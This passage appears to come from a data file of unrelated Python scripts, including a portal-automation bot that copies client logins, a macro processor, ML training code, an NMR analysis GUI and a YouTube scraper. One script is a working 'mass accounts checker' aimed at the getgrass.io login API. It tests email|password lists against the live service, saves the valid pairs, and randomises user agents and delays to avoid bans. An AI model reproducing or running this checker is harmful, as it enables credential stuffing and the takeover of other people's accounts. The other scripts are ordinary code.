'Concluido':\n                    if process == 'VERDADEIRO':\n                        df.at[index, 'PROCESSADO'] = 'Conferir. CNPJ repetido'\n                    continue\n                self.browse(\"https://app.gestta.com.br\")\n                self.maximize_window()\n                \n                if contador_gestta == 0:\n                    self.login(email_gestta, password_gestta, 'email', 'password')\n                    contador_gestta = 1\n                    \n                cnpj = row['CNPJ']\n                name = row['RAZ\u00c3O SOCIAL']\n                state = row['ESTADO']\n                county = row['MUNICIPIO']\n                self.navegate_to_tarefas()\n                login, senha = self.get_login(cnpj)\n                self.create_tab('https://hub.sieg.com/')\n                if contador_sieg == 0:\n                    self.login(email_sieg, password_sieg, 'txtEmail', 'txtPassword')\n                    contador_sieg = 1\n                self.navigate_to_service()\n                self.register_automation(cnpj, name, state, county, login, senha)\n                \n                df.at[index, 'PROCESSADO'] = 'Concluido'\n                \n                df.to_excel(filepath, index=False)\n                \n                if len(self.get_tabs()) > 1:\n                    self.close_page()\n                \n            except AttributeError as e:\n                print(f'Erro de atributo: {e}')\n                if 'get_attribute' in str(e):\n                    df.at[index, 'PROCESSADO'] = 'Login e senha n\u00e3o encontrados no gestta'\n                elif \"click\" in str(e):\n                    df.at[index, 'PROCESSADO'] = 'Empresa n\u00e3o encontrada no gestta'\n                else:\n                    df.at[index, 'PROCESSADO'] = f'Outro erro de atributo: {e}'\n                    \n                df.to_excel(filepath, index=False)\n                \n                if len(self.get_tabs()) > 1:\n                    self.close_page()\n                \n            except Exception as e:\n                print(e)\n                df.at[index, 'PROCESSADO'] = e\n                \n                df.to_excel(filepath, index=False)\n                \n                if len(self.get_tabs()) > 1:\n                    self.close_page()\n            \n            \n    def configure(self):\n        # Configurando o ChromeDriver\n        self.driver_path = ChromeDriverManager().install()\n        self.headless = False\n        \n        \n    def login(self, email, password, id_email, id_password):\n        print('Fazendo login')\n        \n        campo_email = self.find_element(id_email, By.ID, waiting_time=20000)\n        campo_email.send_keys(email)\n        \n        campo_senha = self.find_element(id_password, By.ID, waiting_time=10000)\n        campo_senha.send_keys(password)\n        self.wait(500)\n        self.enter()\n        \n        \n    def navegate_to_tarefas(self):\n        print('Indo at\u00e9 tarefas')\n        menu_tarefas = self.find_element('//*[@id=\"gestta-menu\"]/div/div[5]/div/div/div[2]/div', By.XPATH, waiting_time=20000)\n        menu_tarefas.click()\n        \n        todos_usuarios = self.find_element('//*[@id=\"gestta-multiselect-dropdown-4\"]/div/div/p/i', By.XPATH, waiting_time=20000)\n        todos_usuarios.click()\n        \n        filtro_avancado = self.find_element('//*[@id=\"page-wrapper\"]/div[1]/div/nav/form[1]/div[4]/button[1]', By.XPATH, waiting_time=20000)\n        filtro_avancado.click()\n        \n        marcar_concluida = self.find_element('/html/body/div[1]/div/div/div[2]/form[2]/div[2]/div/label/span', By.XPATH, waiting_time=20000)\n        marcar_concluida.click()\n        \n        filtrar = self.find_element('/html/body/div[1]/div/div/div[2]/div[7]/div/button', By.XPATH, waiting_time=10000)\n        filtrar.click()\n    \n    \n    def get_login(self, cnpj):\n        print('Pegando login e senha')\n        todas_clientes = self.find_element('//*[@id=\"gestta-multiselect-dropdown-8\"]/div/div/p', By.XPATH, waiting_time=10000)\n        todas_clientes.click()\n        campo_empresas = self.find_element('/html/body/ul[1]/li[1]/input', ",
    "from prettytable import PrettyTable\nmdt_table = PrettyTable()\nmnt_table = PrettyTable()\nala_table = PrettyTable()\n\ndef clean(input):\n    input = input.split(\"\\n\")\n    input = [i.strip() for i in input]\n    return input\n    \n\ndef phase_one(input):\n    for line in range(len(input)):\n        # print(i)\n        i = input[line]\n        temp = i.split(' ')\n        # print(temp)\n        if len(temp) > 2 and temp[1].lower() == 'macro':\n            # print(i)\n            index = len(MDT)\n            MNT.append([index, temp[0]])\n            line += 1\n            while line < len(input):\n                curr = input[line]\n                MDT.append(curr)\n                curr_split = curr.split(' ')\n                if curr_split[0].lower() == 'endm':\n                    break\n                line += 1\n\n    print_mdt()\n    print_mnt()\n\ndef check_for_macro(line):\n    if len(line) < 2:\n        return -1\n    \n    for name in MNT:\n        if line[0] in name and line[1].lower() != 'macro':\n            return name[0]\n\n    return -1\n\ndef phase_two():\n    res = []\n    for i in range(len(input)):\n        line = input[i]\n        temp = line.split(' ')\n        index = check_for_macro(temp)\n        if index != -1:\n            ALA.append(temp[1])\n            while (MDT[index].lower() != \"endm\"):\n                temp_line = MDT[index]\n                if 'XX' in temp_line:\n                    temp_line = temp_line.replace(\"XX\", temp[1])\n                res.append(temp_line)\n                index += 1\n        else:\n            res.append(line)\n    print_ala()\n    return res\n\ndef print_mdt():\n    mdt_table.field_names = [\"Index\", \"Macro Definition\"]\n    for i in range(len(MDT)):\n        mdt_table.add_row([i, MDT[i]])\n    print(mdt_table)\n\ndef print_mnt():\n    mnt_table.field_names = [\"Index on MDT\", \"Macro Name\"]\n    for name in MNT:\n        mnt_table.add_row([name[0], name[1]])\n    print(mnt_table)\n\ndef print_ala():\n    ala_table.field_names = [\"Index\", \"Argument Name\"]\n    for i in range(len(ALA)):\n        ala_table.add_row([i, ALA[i]])\n    print(ala_table)\n\n# MDT : Macro Definition Table\nMDT = []\n# MNT : Macro Name Table\nMNT = []\n# ALA : Argument List Array\nALA = []\n\ninput = \"\"\nwith open('input.asm','r') as f:\n    input = f.read()\n\ninput = clean(input)\n# print(input)\nphase_one(input)\nres = phase_two()\n\nprint('\\n--------------OUTPUT--------------------')\nfor i in res:\n    print(i)\n",
    "import requests\nimport time\nimport random\nfrom fake_useragent import UserAgent\nfrom colorama import init, Fore\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\ninit(autoreset=True)\n\nurl = 'https://api.getgrass.io/login'\nheaders = {\n    'origin': 'https://app.getgrass.io',\n    'referer': 'https://app.getgrass.io/',\n    'user-agent': UserAgent().random\n}\n\nbanner = \"\"\"\n     _____)           _____)                           \n   /                /                             ,    \n  /   ___    _ _/_ /   ___   __  _   _   _          ___\n /     / ) _(/_(__/     / ) / (_(_(_/_)_/_)_ o  _(_(_) \n(____ /          (____ /                               \n                                                       \n\"\"\"\nprint(Fore.CYAN + banner + Fore.RESET)\nprint(f\"{Fore.CYAN}     MASS ACCOUNTS CHECKER | github.com/im-hanzou{Fore.RESET}\")\nprint(f\"\\n\")\nfilename = input(f\"{Fore.BLUE}Input your (USER|PASS) file : {Fore.RESET}\")\nprint(f\"\\n\")\n\nvalid_file = 'valid.txt'\ninvalid_pass_file = 'invalidpass.txt'\ninvalid_accs_file = 'invalidaccs.txt'\n\ntry:\n    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:\n        for line in file:\n            parts = line.strip().split('|')\n            if len(parts) < 2:\n                print(f\"{Fore.RED}[ Invalid format in line: {line.strip()} ]{Fore.RESET}\")\n                continue\n            \n            email = parts[0]\n            password = '|'.join(parts[1:])\n            \n            data = {'username': email, 'password': password}\n            response = requests.post(url, headers=headers, json=data, verify=False)\n            \n            if response.status_code == 200:\n                print(f\"{Fore.GREEN}[ {email} | VALID ACCOUNT ]{Fore.RESET}\")\n                with open(valid_file, 'a') as valid_output:\n                    valid_output.write(f\"{email}|{password}\\n\")\n            elif response.status_code == 400:\n                print(f\"{Fore.RED}[ {email} | INVALID PASSWORD ]{Fore.RESET}\")\n                with open(invalid_pass_file, 'a') as invalid_pass_output:\n                    invalid_pass_output.write(f\"{email}|{password}\\n\")\n            elif response.status_code == 404:\n                print(f\"{Fore.RED}[ {email} | INVALID ACCOUNT ]{Fore.RESET}\")\n                with open(invalid_accs_file, 'a') as invalid_accs_output:\n                    invalid_accs_output.write(f\"{email}|{password}\\n\")\n            else:\n                print(f\"{Fore.YELLOW}[  Unknown response: {response.status_code} | YOUR IP BANNED ]{Fore.RESET}\")\n            \n            delay = random.uniform(1, 5) \n            time.sleep(delay)\n\nexcept FileNotFoundError:\n    print(f\"{Fore.RED} File not found :) {Fore.RESET}\")\n",
    "import torch\nimport numpy as np\n\ndef combine_graph(attr_maxt,adj_maxt,wei_maxt):\n    for modal_num in range(attr_maxt.shape[1]):\n        if modal_num == 0:\n            for batch_num in range(attr_maxt.shape[0]):\n                if batch_num == 0:\n                    bc = attr_maxt[batch_num][modal_num]\n                else:\n                    bc = torch.cat([bc,attr_maxt[batch_num][modal_num]],dim=0)\n            mc = bc\n        else:\n            for batch_num in range(attr_maxt.shape[0]):\n                if batch_num == 0:\n                    bc = attr_maxt[batch_num][modal_num]\n                else:\n                    bc = torch.cat([bc,attr_maxt[batch_num][modal_num]],dim=0)\n            mc = torch.cat([mc,bc],dim=0)\n    for modenum in range(attr_maxt.shape[1]):\n        for batch_num in range(attr_maxt.shape[0]):\n            if batch_num == 0:\n                ac = adj_maxt\n            else:\n                ac = torch.cat([ac, adj_maxt + batch_num * attr_maxt.shape[2]], dim=1)\n        if modenum == 0:\n            total_ac = ac.unsqueeze(0)\n        else:\n            total_ac = torch.cat([total_ac,ac.unsqueeze(0)],dim=0)\n    for modenum in range(attr_maxt.shape[1]):\n        for batch_num in range(attr_maxt.shape[0]):\n            if batch_num == 0:\n                wc = wei_maxt\n            else:\n                wc = torch.cat([wc,wei_maxt], dim=0)\n        weight = wc.unsqueeze(0)\n        if modenum == 0:\n            total_wei = weight\n        else:\n            total_wei = torch.cat([total_wei,weight],dim=0)\n    batchcat = mc\n    adjcat = total_ac\n    weicat = total_wei\n    batchnum = attr_maxt.shape[0]\n    return batchcat.float(), adjcat.long(), weicat.float(), batchnum\n\n# gp = torch.rand(2,3,52,20)\n# adj = torch.tensor([[0,1,2],[4,5,6]])\n# wei = torch.tensor([3,3,3])\n# print(gp.shape,adj.shape,wei.shape)\n# mc,ac,wc, batch_num = combine_graph(gp,adj,wei)\n# print(mc.shape,ac.shape,wc.shape,batch_num)\n# print(ac,wc)\n\ndef normalize(input_maxt,mask_Maxt):\n    register = np.zeros((input_maxt.shape[0],input_maxt.shape[1],input_maxt.shape[2]))\n    # for maxt_num in range(mask_Maxt.shape[0]):\n        # print(mask_Maxt[maxt_num].shape)\n    meanvalue = np.mean(mask_Maxt,axis=2)\n    stdvalue = np.std(mask_Maxt,axis=2)\n    # stdvalue = stdvalue + (stdvalue==0)*np.full((stdvalue.shape[0],stdvalue.shape[1]),0.00001)\n    # print(meanvalue.shape,stdvalue.shape)\n    # print(np.tile(np.expand_dims(meanvalue,2),[1,1,input_maxt.shape[2]]))\n    register = (input_maxt - np.tile(np.expand_dims(meanvalue,2),[1,1,input_maxt.shape[2]])) /\\\n               np.tile(np.expand_dims(stdvalue,2),[1,1,input_maxt.shape[2]])\n    return register\n\n# def normalize(input_maxt,mask_Maxt):\n#     register = np.zeros((input_maxt.shape[0],input_maxt.shape[1],input_maxt.shape[2]))\n#     # for maxt_num in range(mask_Maxt.shape[0]):\n#         # print(mask_Maxt[maxt_num].shape)\n#     maxvalue = np.max(mask_Maxt,axis=2)\n#     minvalue = np.min(mask_Maxt,axis=2)\n#     # print(maxvalue,minvalue)\n#     register = (input_maxt - np.tile(np.expand_dims(minvalue,2),[1,1,input_maxt.shape[2]])) /\\\n#                (np.tile(np.expand_dims(maxvalue,2),[1,1,input_maxt.shape[2]]) -\n#                 np.tile(np.expand_dims(minvalue,2),[1,1,input_maxt.shape[2]]))\n#     return register\n\n# sd = np.array([[[1,2,3,4],[1,2,3,4],[1,2,3,4]],[[1,2,3,4],[1,2,3,4],[1,2,3,4]]])\n# print(sd)\n# outsd = normalize(sd,sd)\n# print(outsd)\n\ndef get_adj_wei():\n    position_file = open(\"rawData/IBRL/node.txt\", \"r\")\n    fileDate = position_file.read()\n    nodeMSG = fileDate.split(\"\\n\")\n    # print(nodeMSG)\n    if \"\" in nodeMSG:\n        nodeMSG.remove(\"\")\n    check_file = open(\"processed/IBRL_count.txt\", \"r\")\n    considered_node = list(map(int,eval(check_file.readline().replace(\"\\n\",\"\"))))\n    considered_node.remove(18)\n    # print(considered_node)\n    nodeArray = np.ones((len(considered_node),2))\n    ct = 0\n    for num_index in considered_node:\n        split_msg = nodeMSG[num_index - 1].strip().split(\" \")\n        nodeArray[ct][0] = float(split_msg[1])\n        nodeArray[ct][1] = float(split_msg[2])\n        ct = ct + 1\n    # print(nodeArray)\n    wei_res = []\n    adj_res = []\n    for i in range(nodeArray.shape[0]):\n        for j in range(nodeArray.shape[0]):\n            distance = ((nodeArray[i][0] - nodeArray[j][0]) ** 2 + (nodeArray[i][1] - nodeArray[j][1]) ** 2) ** (1/2)\n            # print(i, j ,distance)\n            wei_res.append(np.array(distance))\n            adj_res.append(np.array([i, j]))\n    wei_res = np.array(wei_res)\n    wei_res = torch.tensor(wei_res / np.max(wei_res))\n    adj = torch.tensor(np.array(adj_res).T)\n    # print(att_res)\n    return adj, wei_res\n\n# adj, wei = get_adj_wei()\n# print(adj.shape,wei.shape)\n# print(wei)\n\ndef get_adj_maxt():\n    position_file = open(\"rawData/IBRL/node.txt\", \"r\")\n    fileDate = position_file.read()\n    nodeMSG = fileDate.split(\"\\n\")\n    # print(nodeMSG)\n    if \"\" in nodeMSG:\n        nodeMSG.remove(\"\")\n    check_file = open(\"processed/IBRL_count.t",
    "import nmrglue as ng\nimport numpy as np\nimport pandas as pd\nimport tkinter as tk\nfrom tkinter import filedialog, messagebox, ttk\nfrom tkinter import *\nimport os\nimport zipfile\nimport shutil\nimport matplotlib.pyplot as plt\nfrom matplotlib.backends.backend_tkagg import FigureCanvasTkAgg, NavigationToolbar2Tk\nfrom scipy.signal import find_peaks\nfrom pandastable import Table, TableModel\nfrom scipy.integrate import simps\nimport sv_ttk\n\n# Global variables\nselected_pdata_dirs = []\ntsp_concentration = 0\nbinning_step = 0.05\nspectra = []\npeak_limits = pd.DataFrame()\n\ndef find_pdata_directories(root_dir):\n    pdata_dirs = []\n    for dirpath, _, filenames in os.walk(root_dir):\n        if \"/pdata/1\" in dirpath:\n            pdata_dirs.append(dirpath)\n    return pdata_dirs\n\ndef browse_directory():\n    global selected_pdata_dirs\n    global spectra\n    global peak_limits\n    file_or_dir = messagebox.askquestion(\"Zipped File or Directory\", \"Are you selecting a zipped file?\", icon='question')\n    if file_or_dir == 'yes':\n            root_dir = filedialog.askopenfilename(title=\"Select the zipped file containing processed Bruker NMR data\")\n            if not root_dir: # User closed the dialog without selecting a file\n                messagebox.showerror(\"Error\", \"No zipped file selected. Please select a valid file.\")\n                return\n            if not root_dir.endswith('.zip'):\n                messagebox.showerror(\"Error\", \"Selected file is not a zip file. Please select a valid zip file.\")\n                return\n            with zipfile.ZipFile(root_dir, 'r') as zip_ref:\n                zip_ref.extractall('Zipped file')\n                root_dir = 'Zipped file'\n    else:\n        root_dir = filedialog.askdirectory(title=\"Select the root directory containing processed Bruker NMR data\")\n        if not root_dir: # User closed the dialog without selecting a directory\n            messagebox.showerror(\"Error\", \"No directory selected. Please select a valid directory.\")\n            return\n    selected_pdata_dirs = [root_dir]\n\n    peak_limits = pd.read_excel(\"peak_limits.xlsx\")\n\n    spectra = []\n    for root_dir in selected_pdata_dirs:\n        pdata_dirs = find_pdata_directories(root_dir)\n        for pdata_dir in pdata_dirs:\n            try:\n                dic, data = ng.bruker.read_pdata(pdata_dir, scale_data=True)\n                udic = ng.bruker.guess_udic(dic, data)\n                uc = ng.fileiobase.uc_from_udic(udic)\n                ppm_scale = uc.ppm_scale()\n                spectra.append((ppm_scale, data))\n            except OSError:\n                continue\n    selected_dirs_label.config(text=f\"Path Chosen: {root_dir}\")\n\n    plot_spectra(spectra, peak_limits)\n\ndef process_selected_dirs_concentration():\n    global selected_pdata_dirs, tsp_concentration\n\n    if not selected_pdata_dirs:\n        messagebox.showerror(\"Error\", \"Please select a data directory.\")\n        return\n\n    try:\n        tsp_concentration = float(concentration_entry.get())\n    except ValueError:\n        messagebox.showerror(\"Error\", \"Invalid concentration value. Please enter a valid number.\")\n        return\n\n    results_concentration = []\n    results_area = []\n    peak_identities = set()\n\n    for root_dir in selected_pdata_dirs:\n        pdata_dirs = find_pdata_directories(root_dir)\n        if not pdata_dirs:\n            messagebox.showwarning(\"No pdata/1 Directories\", f\"No pdata/1 directories found in '{root_dir}'. Skipping.\")\n            continue\n\n        for pdata_dir in pdata_dirs:\n            try:\n                dic, data = ng.bruker.read_pdata(pdata_dir, scale_data=True)\n            except OSError:\n                continue\n\n            udic = ng.bruker.guess_udic(dic, data)\n            uc = ng.fileiobase.uc_from_udic(udic)\n            ppm_scale = uc.ppm_scale()\n\n            peak_limits = pd.read_excel(\"peak_limits.xlsx\")\n\n            ref_name = peak_limits.at[0, 'Peak identity']\n            ref_start = peak_limits.at[0, 'ppm start']\n            ref_end = peak_limits.at[0, 'ppm end']\n            ref_num_protons = peak_limits.at[0, '# protons']\n\n            ref_min_index = np.abs(ppm_scale - ref_start).argmin()\n            ref_max_index = np.abs(ppm_scale - ref_end).argmin()\n            if ref_min_index > ref_max_index:\n                ref_min_index, ref_max_index = ref_max_index, ref_min_index\n\n            ref_peak = data[ref_min_index:ref_max_index + 1]\n            ref_area = ref_peak.sum()\n\n            for index, row in peak_limits.iloc[1:].iterrows():\n                name = row['Peak identity']\n                peak_identities.add(name)\n                start = row['ppm start']\n                end = row['ppm end']\n                num_protons_peak = row['# protons']\n\n                min_index = np.abs(ppm_scale - start).argmin()\n                max_index = np.abs(ppm_scale - end).argmin()\n                if min_index > max_index:\n                    min_index, max_index = max_index, min_index\n\n                peak = data[min_index:max_index + 1]\n    ",
    "from google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.http import MediaIoBaseDownload\nimport googleapiclient\nfrom youtube_transcript_api import YouTubeTranscriptApi\nimport yt_dlp\nimport io\nimport pandas as pd\nfrom tqdm import tqdm\nimport time\n\nclass YouTubeVideo:\n    def __init__(self, api_key, video_id, video_save_folder):\n        self.api_key = api_key\n        #self.client_secrets_file = client_secrets_file\n        self.video_id = video_id                       # \uc720\ud29c\ube0c url\uc5d0\uc11c '=' \uc774\ud6c4\uc758 id\ub97c \ubb38\uc790\uc5f4\ub85c \uc785\ub825\n        self.video_save_folder = video_save_folder\n        self.video_url = f\"https://www.youtube.com/watch?v={video_id}\"\n        self.youtube = build('youtube', 'v3', developerKey=api_key)\n\n    def get_video_info(self):\n        \"\"\"\n        \uc720\ud29c\ube0c \uc601\uc0c1 \uc815\ubcf4 \uc218\uc9d1\n        \uacb0\uacfc = [date, title, desc, thumbnail, views, likes, comments]\n        \"\"\"\n        request = self.youtube.videos().list(\n            part='snippet,statistics',\n            id=self.video_id\n        )\n        response = request.execute()\n        time.sleep(0.2)\n        if response['items']:\n            video = response['items'][0]\n            date, title, desc = (\n                video['snippet']['publishedAt'],  # \uac8c\uc7ac \uc77c\uc2dc\n                video['snippet']['title'],  # \uc81c\ubaa9\n                video['snippet']['description'],  # \uc124\uba85\n            )\n            # thumbnail = \ub300\ud45c \uc774\ubbf8\uc9c0 url # 'standard' key\uac00 \uc5c6\ub294 \uacbd\uc6b0 \ucc98\ub9ac\ub3c4 \uc544\ub798 \ud3ec\ud568\n            thumbnail_info = video['snippet']['thumbnails'].get('standard') or video['snippet']['thumbnails'].get('default')\n            thumbnail = thumbnail_info.get('url') if thumbnail_info else None\n            views, likes, comments = (\n                video['statistics']['viewCount'],  # \uc870\ud68c \uc218\n                video['statistics']['likeCount'],  # \uc88b\uc544\uc694  # \uc2eb\uc5b4\uc694\ub294 \ub298 0\n                video['statistics']['commentCount'],  # \ub313\uae00 \uc218\n            )\n        else:\n            date, title, desc, thumbnail, views, likes, comments = None, None, None, None, None, None, None\n        return [date, title, desc, thumbnail, views, likes, comments]\n\n    def download_video(self):\n        \"\"\"\n        \uc720\ud29c\ube0c \uc601\uc0c1 \ub2e4\uc6b4\ub85c\ub4dc\n        \"\"\"\n        try:\n            # \ub2e4\uc6b4\ub85c\ub4dc \uc635\uc158\n            ydl_opts = {\n                'format': 'worst',  # worst\ub3c4 \ud654\uc9c8 \ubb34\ub09c. best, worst, best[height=720] \ub4f1\uc73c\ub85c \uc124\uc815 \uac00\ub2a5\n                'outtmpl': f'{self.video_save_folder}/%(id)s_%(uploader)s_%(view_count)s_%(title)s.%(ext)s',\n                # \ub2e4\uc6b4\ub85c\ub4dc \ud30c\uc77c\uba85 \ubc0f \uacbd\ub85c \uc124\uc815\n            }\n            # \uc720\ud29c\ube0c \uc601\uc0c1 \ub2e4\uc6b4\ub85c\ub4dc\n            with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n                ydl.download([self.video_url])\n        except Exception as e:\n            print(f\"\ub2e4\uc6b4\ub85c\ub4dc \uc2e4\ud328: %(id)s_%(title)s, \uc5d0\ub7ec: {str(e)}\")\n\n    def get_subtitle(self):\n        \"\"\"\n        \uc720\ud29c\ube0c \uc601\uc0c1\uc758 \uc790\ub9c9 \uc218\uc9d1\n        \"\"\"\n        # Try to get the English transcript for the video\n        try:\n            trans = YouTubeTranscriptApi.get_transcript(self.video_id, languages=['ko'])\n        except Exception as e:\n            print(f\"Error getting transcript: {e}\")\n        # If successful, process and print the transcript\n        texts = [t['text'] for t in trans]\n        result = ' '.join(texts)\n        return result\n\n    def get_comments(self, maxResults=100):  \n        \"\"\"\n        \uc720\ud29c\ube0c \uc601\uc0c1\uc758 \ub313\uae00 \uc218\uc9d1\n        \"\"\"\n        comments = []\n        try:\n            # \uccab \ubc88\uc9f8 \ud398\uc774\uc9c0\uc758 \ub313\uae00 \uac00\uc838\uc624\uae30\n            response = self.youtube.commentThreads().list(\n                part='snippet',\n                videoId=self.video_id,\n                maxResults=maxResults # \ucd5c\ub300 \uacb0\uacfc \uc218\n            ).execute()\n            for item in response.get('items', []):\n                comment = item['snippet']['topLevelComment']['snippet']['textDisplay']\n                comments.append(comment)\n        except Exception as e:\n            print(str(e))\n            comments.append('')\n        return comments\n\n\n",
    "import time\nimport math\nimport torch\nimport torch.nn as nn\nimport pandas as pd\nimport numpy as np\nfrom utils import *\nfrom torch import optim\nfrom torch.autograd import Variable\n\nclass Template(nn.Module):\n    def __init__(self, cfg):\n        super().__init__()\n        self.device = torch.device( cfg['cuda'] if torch.cuda.is_available() else 'cpu')\n        self.verbose = cfg['verbose']\n        self.epochs = cfg['epochs']\n        self.seed = cfg['seed']\n        self.optimizer_name = cfg['optimizer_name']\n        self.optimizer_kwargs = cfg['optimizer_kwargs']\n        self.checkpoint = cfg['model_checkpoint_path']\n        self.batch = cfg['batch']\n\n    # ----- Abstract class methods ----- #\n    def forward(self, X):\n        raise NotImplementedError()\n\n    def get_data_dict_from_dataloader(self, data, phase):\n        raise NotImplementedError()\n    \n    def loss(self, output, data_dict):\n        raise NotImplementedError()\n    \n    def analyse_predictions(self, y_true, y_pred, info={}):\n        raise NotImplementedError()\n    \n    # ----- Standard deep learning step ----- #\n    def train_or_eval_dataset(self, dataloaders, dataset_sizes, phase):\n        assert phase in ['train', 'test'], print('Wrong phase!')\n        if phase == 'train':\n            self.train(True)\n        else:\n            self.train(False)\n        \n        running_loss = 0.0\n        n_batches_loaded = 0\n        loss_details = []\n        concatenated_labels = {}\n        concatenated_outputs = {}\n\n        # get the inputs\n        for data in dataloaders[phase]:\n            n_batches_loaded += 1\n            data_dict = self.get_data_dict_from_dataloader(data)\n            inputs = data_dict['inputs']\n            labels = data_dict['labels']\n            \n            # Zero the parameter gradients\n            self.optimizer.zero_grad()\n\n            # Forward\n            outputs = self.forward(inputs)\n\n            # compute loss\n            loss, loss_detail = self.loss(outputs, data_dict)\n            loss_details.append(loss_detail)\n\n            # record labels and outputs\n            concatenated_labels = extend_dicts(concatenated_labels, labels)\n            concatenated_outputs = extend_dicts(concatenated_outputs, outputs)\n\n            # backward and optimize\n            if phase == 'train':\n                loss.backward()\n                self.optimizer.step()\n            \n            # loss statistics\n            running_loss += loss.data.item() * labels[list(labels.keys())[0]].size(0) # Mean batch loss -> batches loss\n        \n        epoch_loss = running_loss / dataset_sizes[phase] # sum batches loss -> Mean epoch loss\n        info = {\n            'phase': phase,\n            'dataset_size': dataset_sizes[phase],\n            'epoch_loss': epoch_loss,\n            'loss_details': loss_details\n        }\n        metrics_for_epoch = self.analyse_predictions(concatenated_labels, concatenated_outputs, info)\n        if self.verbose['metrics']:\n            print(metrics_for_epoch)\n        \n        return metrics_for_epoch\n\n    \n    def fit(self, dataloaders, dataset_sizes):\n        since = time.time()\n        all_metrics = {}\n\n\n        for epoch in range(self.epochs):\n            epoch_t0 = time.time()\n            print('\\nEpoch {}/{}'.format(epoch, self.epochs - 1))\n            print('-' * 60)\n            metrics_for_epoch = {}\n\n            # train one epoch\n            metrics_for_phase = self.train_or_eval_dataset(dataloaders, dataset_sizes, 'train')\n            metrics_for_epoch.update(metrics_for_phase)\n\n\n            all_metrics[epoch] = metrics_for_epoch\n            print('Total second taken for epoch: %2.3fs' % (time.time() - epoch_t0))\n        \n            if self.verbose['layer_magnitudes']:\n                print('\\n\\n Printing layer magnitudes')\n                self.print_layer_magnitudes(epoch)\n\n        torch.save(self.state_dict(), self.checkpoint)    \n        all_metrics['final_results'] = metrics_for_epoch\n        time_elapse = time.time() - since\n        all_metrics['total_seconds_to_train'] = time_elapse\n        print(\"Training complete in {:.0f}m, {:.0f}s\".format(time_elapse // 60, time_elapse % 60))\n\n        self.load_state_dict(torch.load(self.checkpoint))\n        self.train(False)\n        print('The test set metrics: ')\n        test_metrics = self.train_or_eval_dataset(dataloaders, dataset_sizes, 'test')\n        return test_metrics\n\n        \n    def setup_optimizers(self, optimizer_name, optimizer_kwargs):\n        if optimizer_name == 'sgd':\n            self.optimizer = optim.SGD(\n                filter(lambda p: p.requires_grad, self.parameters()), **optimizer_kwargs\n            )\n        elif optimizer_name == 'adam':\n            self.optimizer = optim.Adam(\n                filter(lambda p: p.requires_grad, self.parameters()), **optimizer_kwargs\n            )\n        else:\n            raise Exception('Not a valid optimizer')\n        \n\n    def print_layer_magnitudes(self, epoch):\n        '''\n        check whether each layer's L2 n",
    "# \u0418\u043c\u043e\u0440\u0442 \u043d\u0443\u0436\u043d\u044b\u0445 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\nfrom time import time\nfrom keras.datasets import imdb\nfrom keras.models import Sequential\nfrom keras.layers import Dense, Embedding, LSTM\nfrom keras.preprocessing.sequence import pad_sequences\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0434\u0430\u0442\u0430\u0441\u0435\u0442\u0430 IMDb\nnum_words = 10000\n(X_train, y_train), (X_test, y_test) = imdb.load_data(num_words=num_words)\n\n# \u041f\u0440\u0435\u0434\u0432\u0430\u0440\u0438\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0432 \u043f\u0430\u0434\u0434\u0438\u043d\u0433\u0430\u043c\u0438 \u0434\u043e \u0434\u043b\u0438\u043d\u044b \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0439 \u043f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\nmaxlen = 500\nX_train = pad_sequences(X_train, maxlen=maxlen)\nX_test = pad_sequences(X_test, maxlen=maxlen)\n\n# \u041f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u0435 \u0430\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\u044b \u043d\u0435\u0439\u0440\u043e\u0441\u0435\u0442\u0438\nmodel = Sequential()\nmodel.add(Embedding(num_words, 32, input_length=maxlen))\nmodel.add(LSTM(100))\nmodel.add(Dense(1, activation='sigmoid'))\n\n# \u041a\u043e\u043c\u043f\u0438\u043b\u044f\u0446\u0438\u044f \u0438 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435 \u043c\u043e\u0434\u0435\u043b\u0438\nstart_time = time()\nmodel.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\nmodel.fit(X_train, y_train, batch_size=64, epochs=5, validation_data=(X_test, y_test))\nstop_time = time()\n\nmodel.summary()\nprint(f'Training time: {stop_time - start_time} seconds')\n\n# \u041e\u0446\u0435\u043d\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0438 \u043d\u0430 \u0442\u0435\u0441\u0442\u043e\u0432\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445\nscores = model.evaluate(X_test, y_test, verbose=0)\nprint(\"Test Accuracy: %.2f%%\" % (scores[1] * 100))\n\n# \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043c\u043e\u0434\u0435\u043b\u0438 (\u043e\u043f\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e)\nmodel.save('model.keras')\n",
